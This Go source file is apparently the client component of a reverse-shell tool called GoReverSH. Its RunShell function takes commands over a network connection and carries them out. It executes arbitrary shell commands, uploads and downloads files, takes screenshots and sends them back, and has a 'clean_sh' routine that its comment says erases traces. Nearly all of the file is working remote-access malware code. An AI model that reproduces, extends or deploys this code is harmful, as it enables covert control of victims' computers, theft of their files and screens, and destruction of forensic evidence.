package pkgclient

import (
	"GoReverSH/config"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

const (
	CHANGE_DIR  string = "cd"
	UPLOAD      string = "upload"
	SCREEN_SHOT string = "screenshot"
	DOWNLOAD    string = "download"
	CLEAN       string = "clean_sh"
)

func RunShell(conn net.Conn) error {
	defer conn.Close()

	//receiver のパターンと同じにする
	for {
		cmdBuff := make([]byte, 1024)
		n, err := conn.Read(cmdBuff)
		if err != nil {
			if errors.Is(err, io.EOF) {
				log.Println("disconnect")
				return err
			}
			log.Println(err)
			return err
		}

		commands := strings.Split(string(cmdBuff[:n]), " ")

		//コマンドの引数の数もチェックすること
		switch commands[0] {
		case CHANGE_DIR:
			if len(commands) != 2 {
				//message
				log.Println(err)
				continue
			}
			dir := commands[len(commands)-1]
			os.Chdir(string(dir))

		case UPLOAD:
			if len(commands) != 2 {
				//message
				log.Println(err)
				continue
			}
			//execUpload
			fileName := commands[len(commands)-1]
			err := ExecUpload(fileName, conn)
			if err != nil {
				log.Println(err)
				continue
			}

		case SCREEN_SHOT: //ex: screenshot
			//スクリーンショットを撮影し送信
			outdir := config.Config.ScreenshotDir

			_, err := Getscreenshot(outdir)
			if err != nil {
				log.Println(err)
				continue
			}

			err = SendFiles(outdir, conn)
			if err != nil {
				log.Println(err)
				continue
			}

			fmt.Println("screenshot finished")

		case DOWNLOAD: //ex: download [path]
			//execDownload
			if len(commands) != 2 {
				//message
				log.Println(err)
				continue
			}

			//ファイルシステム構築
			rootPath := commands[len(commands)-1]

			err := SendFiles(rootPath, conn)
			if err != nil {
				log.Println(err)
			}

		case CLEAN: //痕跡消去 ex: clean_go_reversh
			//execCleanSh
			fmt.Println("CLEAN")

			err := ExecClean()
			if err != nil {
				log.Println(err)
			}

			conn.Close()

			os.Exit(0)

		default:
			//execCommand
			output, err := ExecCommand(string(cmdBuff[:n]), conn)
			if err != nil {
				log.Println(err)
			}
			if output != nil {
				JsonEncodeToConnection(conn, *output)
			}
		}
	}
	return nil
}
